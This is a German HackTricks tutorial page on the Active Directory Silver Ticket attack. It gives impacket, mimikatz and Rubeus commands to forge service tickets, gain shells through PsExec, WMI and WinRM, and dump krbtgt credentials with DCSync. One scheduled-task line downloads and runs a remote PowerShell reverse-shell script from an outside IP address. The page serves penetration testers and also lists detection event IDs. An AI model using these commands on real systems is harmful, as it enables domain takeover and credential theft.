# Silver Ticket

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** für **Intigriti**, eine Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) und beginnen Sie, Prämien von bis zu **$100.000** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver Ticket

Der **Silver Ticket**-Angriff beinhaltet die Ausnutzung von Diensttickets in Active Directory (AD)-Umgebungen. Diese Methode beruht auf der **Erwerbung des NTLM-Hashes eines Dienstkontos**, wie z.B. eines Computer-Kontos, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen und **sich als beliebiger Benutzer ausgeben**, wobei typischerweise administrative Berechtigungen angestrebt werden. Es wird betont, dass die Verwendung von AES-Schlüsseln zur Fälschung von Tickets sicherer und weniger nachweisbar ist.

Für die Ticket-Erstellung werden je nach Betriebssystem unterschiedliche Tools eingesetzt:

### Auf Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Auf Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Der CIFS-Dienst wird als häufiges Ziel hervorgehoben, um auf das Dateisystem des Opfers zuzugreifen, aber auch andere Dienste wie HOST und RPCSS können für Aufgaben und WMI-Abfragen ausgenutzt werden.

## Verfügbare Dienste

| Diensttyp                                   | Dienst-Silber-Tickets                                                    |
| ------------------------------------------- | ------------------------------------------------------------------------ |
| WMI                                         | <p>HOST</p><p>RPCSS</p>                                                |
| PowerShell Remoting                         | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                       | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach nachfragen: WINRM</p> |
| Geplante Aufgaben                           | HOST                                                                   |
| Windows-Dateifreigabe, auch psexec         | CIFS                                                                   |
| LDAP-Operationen, einschließlich DCSync    | LDAP                                                                   |
| Windows Remote Server Administration Tools   | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                     |
| Goldene Tickets                             | krbtgt                                                                 |

Mit **Rubeus** können Sie **alle** diese Tickets mit dem Parameter anfordern:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Ereignis-IDs für Silber-Tickets

* 4624: Kontoanmeldung
* 4634: Abmeldung des Kontos
* 4672: Anmeldung des Administrators

## Missbrauch von Diensttickets

In den folgenden Beispielen stellen wir uns vor, dass das Ticket unter Verwendung des Administratorkontos abgerufen wird.

### CIFS

Mit diesem Ticket können Sie auf den `C$`- und `ADMIN$`-Ordner über **SMB** zugreifen (wenn sie exponiert sind) und Dateien in einen Teil des Remote-Dateisystems kopieren, indem Sie einfach etwas tun wie:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Sie werden auch in der Lage sein, eine Shell im Host zu erhalten oder beliebige Befehle mit **psexec** auszuführen:

{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

Mit dieser Berechtigung können Sie geplante Aufgaben auf Remote-Computern erstellen und beliebige Befehle ausführen:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Mit diesen Tickets können Sie **WMI im Opfersystem ausführen**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Finden Sie **weitere Informationen über wmiexec** auf der folgenden Seite:

{% content-ref url="../lateral-movement/wmiexec.md" %}
[wmiexec.md](../lateral-movement/wmiexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Mit winrm-Zugriff über einen Computer können Sie **darauf zugreifen** und sogar eine PowerShell erhalten:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Überprüfen Sie die folgende Seite, um **mehr Möglichkeiten zu erfahren, sich mit einem Remote-Host über winrm zu verbinden**:

{% content-ref url="../lateral-movement/winrm.md" %}
[winrm.md](../lateral-movement/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Beachten Sie, dass **winrm aktiv und hörend** auf dem Remote-Computer sein muss, um darauf zuzugreifen.
{% endhint %}

### LDAP

Mit diesem Privileg können Sie die DC-Datenbank mit **DCSync** dumpen:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Erfahren Sie mehr über DCSync** auf der folgenden Seite:

## Referenzen

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** für **Intigriti**, eine Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) heute bei und beginnen Sie, Prämien von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
